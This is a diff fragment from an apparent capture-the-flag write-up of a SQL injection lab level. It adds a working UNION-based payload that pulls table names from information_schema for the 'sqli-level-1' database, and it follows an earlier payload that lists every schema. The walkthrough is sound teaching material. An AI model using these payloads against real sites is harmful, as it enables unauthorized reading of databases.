@@ -68,3 +68,11 @@
 ***`URL: XYZ.online/post.php?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(SCHEMA_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.schemata+--+-`***
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-6.png" alt="Numbers payload">
+
+**This payload returned all databases name, we are looking for ***"sqli-level-1"***. let's find database's tables:**
+
+***Payload: `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(TABLE_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.tables+WHERE+TABLE_SCHEMA='sqli-level-1'+--+-`***
+
+<img src="../static/image/SQLi-img/voorivex-academy-sqli1-7.png" alt="Numbers payload">
+
+**Now we know where is flag.**
